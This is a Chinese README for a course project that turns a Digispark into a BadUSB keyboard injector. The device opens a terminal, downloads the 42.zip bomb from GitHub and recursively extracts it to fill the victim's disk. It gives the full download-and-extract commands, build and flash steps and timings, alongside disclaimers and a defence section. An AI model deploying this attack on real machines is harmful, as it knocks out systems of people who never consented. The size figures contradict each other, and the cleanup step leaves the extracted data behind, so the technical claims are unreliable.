# Zip Bomb HID 攻擊實作

這是一個資安課程的教育專案，演示如何使用 BadUSB (HID 鍵盤注入) 自動下載並解壓縮 zip bomb。

## ⚠️ 警告與免責聲明

**本專案僅供教育和授權測試使用！**

- ✅ 學術課程作業
- ✅ CTF 競賽練習
- ✅ 授權的滲透測試
- ✅ 個人虛擬機測試
- ❌ 未經授權在他人系統使用屬違法行為

**使用者需對自己的行為負全部責任。**

---

## 📋 專案概述

### Zip Bomb 是什麼？

**Zip Bomb** (壓縮炸彈) 是一種利用壓縮演算法特性的阻斷服務攻擊：

- 壓縮檔案極小 (幾十 KB)
- 解壓後會產生巨量資料 (數 GB 至 PB 級別)
- 用於測試系統對異常大小檔案的處理能力

### 42.zip 技術規格

| 項目 | 數值 |
|------|------|
| **壓縮大小** | 42 KB |
| **密碼** | `42` |
| **壓縮格式** | ZIP 5.1 (LZMA) - 需要 7z 解壓 |
| **結構** | 5 層巢狀結構 (layer → lib → book → paper → leaf) |
| **第一層解壓** | 16 個 35KB zip 檔 (560KB) |
| **完整第一層** | 68.7 GB (需遞迴解壓 4 次) |
| **完全解壓** | 4.5 PB |
| **來源** | [iamtraction/ZOD](https://github.com/iamtraction/ZOD) |

### 巢狀結構說明

```
42.zip (42 KB)
├─ lib 0.zip (35 KB)
│  ├─ book 0.zip (29 KB)
│  │  ├─ paper 0.zip (24 KB)
│  │  │  ├─ leaf 0.zip (19 KB)
│  │  │  │  └─ 16 個檔案，每個 268 MB = 4.3 GB
│  │  │  └─ ... (16 個 leaf)
│  │  └─ ... (16 個 paper)
│  └─ ... (16 個 book)
└─ ... (16 個 lib) = 68.7 GB 總計
```

**攻擊行為：** HID 攻擊會自動執行完整遞迴解壓，產生 68.7GB 資料！

### 攻擊流程

```
插入 Digispark → 開啟終端機 → 下載 42.zip → 完整遞迴解壓 → 產生 68.7GB 資料
```

⚠️ **重要警告：**

- **攻擊程式會自動執行完整遞迴解壓**
- **會產生 68.7GB 的資料填滿磁碟**
- **僅在虛擬機中測試，且確保有足夠空間**
- **解壓過程需要數分鐘，期間會持續消耗資源**

---

## 🛠️ 檔案說明

### 1. `zipbomb_macos.ino` - macOS 版本

**流程：**
1. Cmd+Space 開啟 Spotlight
2. 輸入 "Terminal" 啟動終端機
3. 執行命令下載並**完整遞迴解壓**到 `/tmp`

**命令：**
```bash
cd /tmp && curl -LO '...' && 7z x -p42 -y 42.zip && for i in 1 2 3 4; do find . -name '*.zip' -exec sh -c '7z x -p42 -y "$1" >/dev/null 2>&1 && rm "$1"' _ {} \;; done
```

**命令說明：**
- `curl -LO`: 下載 42.zip (42 KB)
- `7z x -p42 -y`: 解壓第一層 → 16 個 lib*.zip
- `for i in 1 2 3 4`: **遞迴解壓 4 層**
  - Layer 1: lib → book (16 → 256 個)
  - Layer 2: book → paper (256 → 4,096 個)
  - Layer 3: paper → leaf (4,096 → 65,536 個)
  - Layer 4: leaf → 最終檔案 (**產生 68.7 GB**)

**重要：為什麼用 7z？**
- 42.zip 使用 **LZMA 壓縮** (ZIP 5.1 規格)
- 系統內建 `unzip` 只支援 ZIP 4.5
- **必須使用 7z** 才能正確解壓

**預期結果：**
- 下載: ~1 秒
- 解壓: 3-10 分鐘
- 最終: **68.7 GB**

**測試環境：**
- macOS 10.15+
- 需要網路連線
- /tmp 需要至少 70GB 可用空間

### 2. `zipbomb_linux.ino` - Linux 版本

**流程：**
1. Ctrl+Alt+T 開啟終端機
2. 執行命令下載並**完整遞迴解壓**到 `/tmp`

**命令：**
```bash
cd /tmp && wget -q '...' && 7z x -p42 -y 42.zip && for i in 1 2 3 4; do find . -name '*.zip' -exec sh -c '7z x -p42 -y "$1" >/dev/null 2>&1 && rm "$1"' _ {} \;; done
```

**命令說明：**
- `wget -q`: 靜默下載 42.zip
- `7z x -p42 -y`: 解壓第一層
- `for i in 1 2 3 4`: **遞迴解壓 4 層**
  - 自動處理所有巢狀 zip
  - 解壓後刪除 zip 節省空間
  - 最終產生 **68.7 GB 資料**

**重要：為什麼用 7z？**
- 42.zip 使用 **LZMA 壓縮** (ZIP 5.1 規格)
- 系統內建 `unzip` 只支援 ZIP 4.5
- **必須使用 7z** 才能正確解壓

**預期結果：**
- 下載: ~1 秒
- 解壓: 3-10 分鐘
- 最終: **68.7 GB**

**支援發行版：**
- Ubuntu / Linux Mint
- Fedora / CentOS
- Debian
- 任何支援 Ctrl+Alt+T 的桌面環境

---

## 🚀 使用方法

### 前置需求

1. **硬體：**
   - Digispark ATtiny85 開發板
   - USB 傳輸線

2. **軟體：**
   - Arduino IDE 或編譯環境
   - TrinketHidCombo 函式庫
   - micronucleus 燒錄工具

3. **目標系統需求：**
   - **必須安裝 7z** (7-Zip)
     - macOS: `brew install p7zip`
     - Linux: `sudo apt install p7zip-full` (Ubuntu/Debian)
     - Linux: `sudo dnf install p7zip` (Fedora)
   - 網路連線
   - 至少 70GB 可用磁碟空間

4. **測試環境：**
   - 虛擬機 (VMware / VirtualBox)
   - 至少 70GB 可用磁碟空間

### 編譯與燒錄

現在每個版本都有專用的編譯腳本，無需手動複製檔案！

#### macOS 版本

```bash
cd ~/Developer/hw-018-keyboard-attack

# 只編譯
./build_zipbomb_macos.sh compile

# 只燒錄
./build_zipbomb_macos.sh upload

# 編譯 + 燒錄 (推薦)
./build_zipbomb_macos.sh all

# 清理建置檔案
./build_zipbomb_macos.sh clean
```

#### Linux 版本

```bash
cd ~/Developer/hw-018-keyboard-attack

# 只編譯
./build_zipbomb_linux.sh compile

# 只燒錄
./build_zipbomb_linux.sh upload

# 編譯 + 燒錄 (推薦)
./build_zipbomb_linux.sh all

# 清理建置檔案
./build_zipbomb_linux.sh clean
```

#### 使用 Distrobox 容器

如果你使用 Bazzite 或其他不可變系統：

```bash
# macOS 版本
distrobox enter arduino-dev -- ./build_zipbomb_macos.sh all

# Linux 版本
distrobox enter arduino-dev -- ./build_zipbomb_linux.sh all
```

### 執行測試

⚠️ **重要提醒：攻擊會自動產生 68.7GB 資料！**

#### 準備虛擬機

1. **建立測試環境**
   - 使用 VMware 或 VirtualBox
   - 分配至少 **80GB 虛擬磁碟**
   - **建立快照** (測試後可快速還原)
   - 確認網路連線正常

2. **檢查目標系統需求**
   ```bash
   # 確認 7z 已安裝
   which 7z  # 應顯示 /usr/bin/7z

   # 確認磁碟空間
   df -h /tmp  # 至少需要 70GB 可用空間
   ```

#### 執行 HID 攻擊

1. **插入 Digispark**
   - 等待終端機自動開啟
   - 觀察命令自動輸入並執行

2. **觀察解壓過程**

   在另一個終端視窗即時監控：
   ```bash
   # 方法 1: 即時顯示磁碟使用
   watch -n 1 'df -h /tmp && echo && du -sh /tmp'

   # 方法 2: 監控檔案數量
   watch -n 2 'find /tmp -type f | wc -l'
   ```

3. **預期時間軸**
   ```
   0:00 - 下載 42.zip (42 KB)
   0:01 - 解壓 Layer 1 (lib*.zip) - 560 KB
   0:05 - 解壓 Layer 2 (book*.zip) - 7.3 MB
   0:30 - 解壓 Layer 3 (paper*.zip) - 98 MB
   2:00 - 解壓 Layer 4 (leaf*.zip) - 1.2 GB
   5:00 - 解壓 Layer 5 (最終檔案) - 68.7 GB ✅
   ```

   *實際時間視系統效能而定*

4. **驗證結果**
   ```bash
   # 查看總大小
   du -sh /tmp
   # 預期輸出: 69G    /tmp

   # 查看檔案數量
   find /tmp -type f | wc -l
   # 預期輸出: ~1,048,576 個檔案

   # 查看磁碟使用
   df -h /tmp
   ```

#### 手動執行命令（測試用）

如果想手動測試命令：

**macOS：**
```bash
cd /tmp && curl -LO 'https://github.com/iamtraction/ZOD/raw/refs/heads/master/42.zip' && 7z x -p42 -y 42.zip && for i in 1 2 3 4; do find . -name '*.zip' -exec sh -c '7z x -p42 -y "$1" >/dev/null 2>&1 && rm "$1"' _ {} \;; done
```

**Linux：**
```bash
cd /tmp && wget -q 'https://github.com/iamtraction/ZOD/raw/refs/heads/master/42.zip' && 7z x -p42 -y 42.zip && for i in 1 2 3 4; do find . -name '*.zip' -exec sh -c '7z x -p42 -y "$1" >/dev/null 2>&1 && rm "$1"' _ {} \;; done
```

#### 清理環境
   ```bash
   # macOS / Linux 通用
   rm -rf /tmp/42.zip /tmp/*.zip
   ```

---

## 🔍 技術細節

### TrinketHidCombo 函式庫

這個專案使用 TrinketHidCombo 而非 DigiKeyboard，因為：

- ✅ 支援更多按鍵組合
- ✅ 更穩定的 USB HID 實作
- ✅ 支援媒體鍵 (雖然本專案未使用)

### 關鍵函式

```cpp
TrinketHidCombo.begin()                        // 初始化 USB HID
TrinketHidCombo.pressKey(modifier, keycode)    // 按下按鍵
TrinketHidCombo.print("text")                  // 輸入字串
TrinketHidCombo.poll()                         // 維持 USB 連線
```

### 按鍵定義

| 功能 | macOS | Linux |
|------|-------|-------|
| 開啟搜尋 | Cmd+Space | Super (不使用) |
| 開啟終端 | 透過 Spotlight | Ctrl+Alt+T |
| 執行命令 | Enter | Enter |

### 延遲時間考量

| 動作 | 延遲 (ms) | 原因 |
|------|----------|------|
| USB 辨識 | 1000 | 等待系統載入驅動 |
| Spotlight | 1000 | 等待介面反應 |
| Terminal 啟動 | 2000 | 等待應用程式載入 |
| 命令輸入後 | 300 | 確保字串完整傳送 |

---

## 🛡️ 防禦措施

### 如何防範 BadUSB 攻擊

1. **實體安全**
   - 不插入來路不明的 USB 裝置
   - 監控工作區域的實體存取
   - 使用 USB 埠鎖

2. **系統設定**
   - 停用未使用的 USB HID 功能
   - 設定 USB 裝置白名單
   - 需要管理員權限才能安裝新裝置

3. **作業系統防護**
   - macOS: 系統偏好設定 → 安全性與隱私 → 鎖定螢幕保護
   - Linux: 使用 USBGuard 工具
   - Windows: 裝置管理原則 (GPO)

### 如何防範 Zip Bomb

1. **防毒軟體**
   - 現代防毒軟體可偵測已知 zip bomb
   - 設定最大解壓縮大小限制

2. **系統配額**
   - 設定磁碟配額 (disk quota)
   - 限制 /tmp 目錄大小

3. **解壓工具**
   - 使用安全的解壓工具 (自動檢測異常壓縮比)
   - 避免自動解壓未知來源檔案

---

## 📊 實驗數據

### 解壓層級分析

```
Layer 0 (原始):  42 KB
Layer 1:         16 × 4.3 GB   = 68.7 GB   (本專案目標)
Layer 2:         16 × 68.7 GB  = 1.1 TB
Layer 3:         16 × 1.1 TB   = 17.6 TB
Layer 4:         16 × 17.6 TB  = 281.5 TB
Layer 5:         16 × 281.5 TB = 4.5 PB
```

### 測試環境建議

| 環境 | 配置 | 用途 |
|------|------|------|
| **開發** | 虛擬機 10GB 磁碟 | 編譯和語法測試 |
| **基本測試** | 虛擬機 80GB 磁碟 | 完整 Layer 1 測試 |
| **進階研究** | 實體機 1TB+ | 多層解壓研究 |

---

## 🔗 參考資料

### 相關專案

- [iamtraction/ZOD](https://github.com/iamtraction/ZOD) - 42.zip 原始來源
- [Adafruit Trinket USB](https://github.com/adafruit/Adafruit-Trinket-USB) - TrinketHidCombo 函式庫
- [Digistump Wiki](http://digistump.com/wiki/) - Digispark 官方文件

### 學術資源

- [OWASP BadUSB](https://owasp.org/www-community/attacks/BadUSB)
- [Zip Bomb 技術分析 (Wikipedia)](https://en.wikipedia.org/wiki/Zip_bomb)
- [HID Attack Vectors](https://attack.mitre.org/techniques/T1091/)

### 工具與函式庫

- [micronucleus](https://github.com/micronucleus/micronucleus) - Digispark bootloader
- [V-USB](https://www.obdev.at/products/vusb/) - 軟體 USB 實作
- [Arduino IDE](https://www.arduino.cc/en/software)

---

## 📝 實驗報告範本

如果這是你的課程作業，可以參考以下結構：

### 報告大綱

1. **摘要**
   - 研究目的與動機
   - 使用的技術與工具

2. **背景知識**
   - BadUSB 攻擊原理
   - Zip Bomb 原理與歷史

3. **實作方法**
   - 硬體選擇 (Digispark)
   - 軟體實作 (TrinketHidCombo)
   - 攻擊流程設計

4. **實驗結果**
   - 測試環境說明
   - 執行結果 (截圖、時間記錄)
   - 系統影響分析

5. **防禦措施**
   - 實體防護
   - 軟體防護
   - 組織政策

6. **結論與心得**
   - 學習收穫
   - 實務應用
   - 倫理思考

---

## 🤝 貢獻

這是一個教育專案。如果你有改進建議：

- 報告問題 (Issues)
- 提交改進 (Pull Requests)
- 分享測試結果

---

## 📄 授權與倫理

**本專案遵循以下原則：**

1. **教育優先** - 目的是學習資安知識
2. **授權使用** - 僅在獲得明確許可的環境使用
3. **負責態度** - 使用者需對行為負全責
4. **開放分享** - 促進資安社群知識交流

**記住：強大的能力伴隨著重大的責任。**

---

## 📧 聯絡資訊

如有疑問或需要協助，請：

- 查閱專案文件
- 搜尋相關技術論壇
- 聯繫你的課程指導教授

---

**最後更新**: 2025-12-17
**版本**: 1.0
**授權**: Educational Use Only
